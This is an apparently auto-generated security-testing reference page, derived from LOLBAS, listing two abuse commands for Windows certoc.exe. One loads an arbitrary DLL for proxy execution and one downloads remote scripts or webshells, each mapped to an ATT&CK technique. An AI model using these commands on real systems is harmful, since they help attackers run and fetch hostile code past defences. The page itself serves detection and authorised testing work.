---
parsed_by: focuslocust
source: commands
type: generated
---
# CertOC Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## CertOC.exe

Tool page: [CertOC.exe](../../tools/windows/certoc.exe.md)

### Execute code within DLL file

```text
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

Description:

Loads the target DLL file

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certoc.yml` |
| Evidence | Command preserved from source parser. |

### Download scripts, webshells etc.

```text
certoc.exe -GetCACAPS {REMOTEURL:.ps1}
```

Description:

Downloads text formatted files

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certoc.yml` |
| Evidence | Command preserved from source parser. |
